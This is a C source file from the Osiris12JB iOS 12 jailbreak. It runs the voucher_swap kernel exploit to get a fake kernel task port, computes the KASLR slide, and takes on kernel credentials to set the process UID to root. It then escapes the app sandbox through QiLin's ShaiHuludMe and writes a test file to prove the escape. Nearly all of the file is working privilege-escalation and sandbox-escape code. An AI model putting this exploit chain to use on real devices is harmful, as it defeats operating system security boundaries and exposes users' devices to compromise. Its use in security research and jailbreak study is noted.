//
//  beginOsiris.c
//  Osiris12JB
//
//  Created by GeoSn0w (@FCE365) on 1/30/19.
//
//

#include "beginOsiris.h"
#include "voucher_swap.h"
#include <mach/mach.h>
#include "kutils.h"
#include "kmem.h"
#include "offsets.h"
#include "patchfinder64.h"
#include "exploit_additions.h"
#include <spawn.h>
#include "kernel_memory.h"
#include <mach/mach.h>
#include "kexecute.h"
#include <sys/stat.h>
#include "user_client.h"
#include "QiLin.h"

#define HardBase 0xFFFFFFF007004000

uint64_t kernel_base;
uint64_t slide;
uint32_t myPid;
uint64_t myProc;
uint64_t kern_proc;
uint64_t ucred_field, ucred;
mach_port_t tfpzero = MACH_PORT_NULL;

int run_exploit_and_shaiHulud() {
    voucher_swap();
    prepare_for_rw_with_fake_tfp0(kernel_task_port);
    tfpzero = tfp0;
    task_port_kaddr = current_task;
    return 0;
}

int begin() {
    if (offsets_init() == 0){
        //Offsets are fine, we proceed.
        run_exploit_and_shaiHulud();
    }
    return 0;
}
int GetRootOrGetLeft(mach_port_t tfpzero) {
    
    int err = 0;
    
    if (tfp0 == MACH_PORT_NULL) {
        return -2;
    }
    printf("tfpzero is %d", tfpzero);
    tfpzero = tfp0;
    if (tfpzero == MACH_PORT_NULL) {
            printf("Fake tfpzero is %d", tfpzero);
        return -2;
    }
    slide = get_kaslr_slide();
    printf("[i] Getting kernel slide...\n[+] Got Slide?: 0x%016llx\n", slide);
    
    kernel_base = slide + 0xFFFFFFF007004000;
    printf("Still here...\n");
    init_kernel(kernel_base, NULL);
    init_kexecute();
    
    myPid = getpid();
    myProc = get_proc_struct_for_pid(myPid);
    kern_proc = get_proc_struct_for_pid(0);
    
    if (!myProc || !kern_proc) {
        printf("[!] We failed hard.\n");
        goto fail;
    }
    
    printf("[i] Current UID: %d\n", getuid());
    printf("[i] My proc (0x%016llx) vs ", myProc);
    printf("Kernel's proc (0x%016llx) \n", kern_proc);
    printf("[i] Getting root on iOS 12.1.2 in 3...2...1...\n");
    
    assume_kernel_credentials(&ucred_field, &ucred);
    //We out here!
    setuid(0);
    printf("[+] GOT ROOT!\n");
    return 0;
    
fail:
    term_kexecute();
    term_kernel();
    return err;
}
int beginQiLin(){
    if (initQiLin(tfp0, kernel_base) == 0){
        return 0;
    }
    return -1;
}
int shaiHuludMeMoar(){
    if (ShaiHuludMe(0) == 0){
        printf("[i] Escaping THE FUCK out of the Sandbox...\n");
    }
    FILE * testfile = fopen("/var/mobile/Media/Downloads/OsirisJailbreak", "w");
    if (!testfile) {
        printf("[i] We failed! Still Sandboxed\n");
        return -1;
    }else {
        printf("[i] Suck Sid! Up yours, dear SandBox!\n");
        printf("[+] Wrote file OsirisJailbreak to /var/mobile/Media/Downloads/ successfully!\n");
    }
    return 0;
}
